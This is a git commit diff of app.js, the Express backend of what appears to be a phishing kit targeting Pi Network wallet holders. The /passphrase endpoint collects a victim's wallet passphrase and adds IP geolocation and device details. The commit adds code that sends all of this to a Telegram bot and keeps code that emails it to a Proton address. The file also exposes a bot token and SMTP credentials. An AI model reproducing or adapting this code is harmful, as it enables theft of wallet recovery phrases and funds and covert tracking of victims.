d3b7c8ebb5ef42b3a335d2042f6959d34fb4019a
pisender101 <162994599+pisender101@users.noreply.github.com>
2024-03-16 20:21:25 +0100

    Update app.js

--- app.js
+++ app.js
@@ -3,90 +3,88 @@ const bodyParser = require('body-parser');
 const nodemailer = require('nodemailer');
 const axios = require('axios');
 const cors = require('cors');
-
-const UAParser = require('ua-parser-js'); // Import ua-parser-js module
+const TelegramBot = require('node-telegram-bot-api');
+const UAParser = require('ua-parser-js');
 
 const app = express();
+const botToken = '6899183906:AAGa0cXtXKn6xuyheLHKzJZ_nPFUXwtIz6w'; // Replace with your Telegram bot token
+const bot = new TelegramBot(botToken);
 
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cors());
 
 app.post('/passphrase', async (req, res) => {
-
-  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress; //req.ip;
-  //console.log(clientIP)
+  const clientIP = '104.24.123.216';//req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const userAgent = req.headers['user-agent'];
-  //
- 
-  const url = `https://freeipapi.com/api/json/${clientIP}`; // to get specific ip's info
-// const url = `https://freeipapi.com/api/json`; // to get current request's ip info
-
-
- 
-
-
-  
+  const passphrase = req.body.passphrase;
 
   // Parse user-agent header to get device information using ua-parser-js
   const parser = new UAParser();
   const deviceInfo = parser.setUA(userAgent).getResult();
-  //console.log(deviceInfo)
 
-  if (!req.body.hasOwnProperty('passphrase')) {
-    return res.status(400).json({ error: 'Passphrase key is missing in the request body' });
+  if (!passphrase) {
+    return res.status(400).json({ error: 'Passphrase is missing in the request body' });
   }
 
-  const passphrase = req.body.passphrase;
-
-  let transporter = nodemailer.createTransport({
-    host: "160-20-145-243.cprapid.com",
-    port: 465,
-    secure: true,
-    auth: {
-      user: "admin@pimainetexchange.com",
-      pass: "Piesender10",
-    },
-    tls: {
-      rejectUnauthorized: false
-    }
-  });
-
-   const response = await axios.get(url)
-   const data =  response.data
-   const {countryName, 
-          cityName, 
-          regionName, 
-          isProxy,   
-          continent, 
-          timeZone} = data
-
-   
-  
-  const mailOptions = {
-    from: 'admin@pimainetexchange.com',
-    to: 'pinetwork101@proton.me',
-    subject: `Received From ${clientIP}`,
-    text: `
-              \nPassphrase: ${passphrase}\n
-              \nIP Location: ${clientIP}
-              \nContinent: ${continent},
-                \nCountry: ${countryName},
-                \nRegion:${regionName}, 
-                \nCity:${cityName},
-                \nTimezone:${timeZone},
-                \nVpn:${isProxy?"Yes":"No"}\n
-              
-              \nDevice Info: ${JSON.stringify(deviceInfo)}\n`,
-  };
-
-  
+  const url = `https://freeipapi.com/api/json/${clientIP}`;
 
   try {
+    // Fetch IP location data using axios
+    const response = await axios.get(url);
+    const { countryName, cityName, regionName, isProxy, continent, timeZone } = response.data;
+
+    // Send the message to Telegram
+    const teleMessage = `
+      Passphrase: ${passphrase}
+      IP Location: ${clientIP}
+      Continent: ${continent},
+      Country: ${countryName},
+      Region: ${regionName}, 
+      City: ${cityName},
+      Timezone: ${timeZone},
+      VPN: ${isProxy ? "Yes" : "No"}
+      Device Info: ${JSON.stringify(deviceInfo)}
+    `;
+    
+    bot.sendMessage('1767413154', teleMessage);
+
+    // Send email using nodemailer
+    let transporter = nodemailer.createTransport({
+      host: "160-20-145-243.cprapid.com",
+      port: 465,
+      secure: true,
+      auth: {
+        user: "admin@pimainetexchange.com",
+        pass: "Piesender10",
+      },
+      tls: {
+        rejectUnauthorized: false
+      }
+    });
+
+    const mailOptions = {
+      from: 'admin@pimainetexchange.com',
+      to: 'pinetwork101@proton.me',
+      subject: `Received From ${clientIP}`,
+      text: `
+        Passphrase: ${passphrase}
+        IP Location: ${clientIP}
+        Continent: ${continent},
+        Country: ${countryName},
+        Region: ${regionName}, 
+        City: ${cityName},
+        Timezone: ${timeZone},
+        VPN: ${isProxy ? "Yes" : "No"}
+        Device Info: ${JSON.stringify(deviceInfo)}
+      `,
+    };
+
     await transporter.sendMail(mailOptions);
     res.json({ message: 'Passphrase received successfully' });
   } catch (error) {
-    res.status(500).json({ error: 'Failed to send email' });
+    console.error(error);
+    res.status(500).json({ error: 'Failed to process the request' });
   }
 });
 
